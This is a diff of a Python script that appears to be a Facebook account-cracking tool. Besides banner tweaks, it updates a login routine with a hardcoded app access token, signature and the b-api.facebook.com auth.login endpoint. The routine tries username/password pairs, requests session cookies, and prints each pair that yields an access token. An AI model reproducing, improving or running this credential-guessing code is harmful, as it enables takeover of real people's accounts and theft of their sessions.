@@ -30,7 +30,7 @@ def kontol():
 \x1b[1;94m────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Mhd Syafii
 \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampam305
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def jembut():
@@ -43,7 +43,7 @@ def jembut():
 \x1b[1;94m────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Mhd Syafii
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampam305
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def yayanxd():
@@ -108,7 +108,7 @@ def moch_yayan():
                   os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
-             b = "100004623370585%7C62f8ce9f74b12f84c123cc23437a4a32"
+             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
              params = {
                      'access_token': b,
                      'format': 'JSON',
@@ -120,8 +120,8 @@ def moch_yayan():
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             mobile = 'https://mobile.facebook.com/method/auth.login'
-             response = requests.get(mobile, params=params)
+             api = 'https://b-api.facebook.com/method/auth.login'
+             response = requests.get(api, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                  print()
